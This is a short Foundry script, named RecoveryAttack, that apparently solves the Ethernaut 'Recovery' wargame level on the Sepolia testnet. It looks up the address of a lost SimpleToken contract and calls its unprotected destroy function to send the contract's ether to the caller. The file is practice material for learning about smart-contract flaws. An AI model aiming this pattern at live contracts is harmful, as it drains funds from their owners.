// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {SimpleToken} from "src/17Recovery.sol";

contract RecoveryAttack is Script {
    address constant CHALLENGE = 0xd159467ead97F73E7BB0C0417D7388c0AAe39f6D;
    SimpleToken public simpleToken;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        // https://sepolia.etherscan.io/address/0xd159467ead97F73E7BB0C0417D7388c0AAe39f6D#internaltx
        simpleToken = SimpleToken(payable(0xa1Fbcc2F3e95473A488983f38206ADfa04dd2422));
        simpleToken.destroy(payable(msg.sender));
        vm.stopBroadcast();
    }
}
